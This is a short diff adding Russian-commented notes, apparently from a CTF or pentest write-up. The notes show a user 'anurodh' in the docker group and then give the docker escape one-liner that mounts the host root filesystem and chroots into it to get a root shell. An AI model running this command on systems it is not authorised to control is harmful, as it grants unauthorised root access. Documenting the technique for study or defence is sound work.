@@ -1,0 +1,5 @@
+# Если пользователь в группе docker:
+id
+uid=1002(anurodh) gid=1002(anurodh) groups=1002(anurodh),999(docker)
+# Это дает права на управление контейнерами, а также получение root-прав:
+docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
